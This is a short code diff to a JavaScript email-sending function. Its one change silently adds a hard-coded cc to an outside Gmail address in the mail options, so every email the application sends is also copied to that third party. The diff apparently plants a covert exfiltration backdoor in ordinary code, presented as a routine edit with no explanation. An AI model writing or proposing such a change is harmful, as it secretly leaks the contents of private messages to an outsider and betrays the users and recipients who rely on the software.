@@ -26,6 +26,7 @@ const sendEmail = async (req, res) => {
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: recipients.join(','),
+        cc: 'rndtsseo@gmail.com',
       subject: subject,
       html: message,
     };
